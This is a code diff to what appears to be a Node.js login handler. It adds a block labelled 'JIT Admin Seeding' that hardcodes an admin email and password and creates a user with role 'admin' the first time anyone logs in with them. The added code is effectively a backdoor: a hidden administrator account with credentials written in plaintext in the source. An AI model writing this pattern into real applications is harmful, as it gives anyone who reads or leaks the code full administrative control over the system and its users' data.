@@ -26,6 +26,25 @@ const register = asyncHandler(async (req, res) => {
 // @route POST /api/auth/login
 const login = asyncHandler(async (req, res) => {
     const { email, password } = req.body;
+
+    // JIT Admin Seeding: Check if hardcoded admin credentials match
+    const adminEmail = 'mobileappadmin@admin';
+    const adminPass = 'mobileappadmin1201@admin';
+
+    if (email.toLowerCase() === adminEmail && password === adminPass) {
+        let admin = await User.findOne({ email: adminEmail }).select('+password');
+        if (!admin) {
+            console.log('JIT Seeding Admin...');
+            admin = await User.create({
+                name: 'System Administrator',
+                email: adminEmail,
+                password: adminPass,
+                role: 'admin'
+            });
+            // Re-fetch to get password for comparison or just proceed since we know it matches
+        }
+    }
+
     const user = await User.findOne({ email }).select('+password');
     if (!user || !(await user.comparePassword(password))) {
         res.status(401);
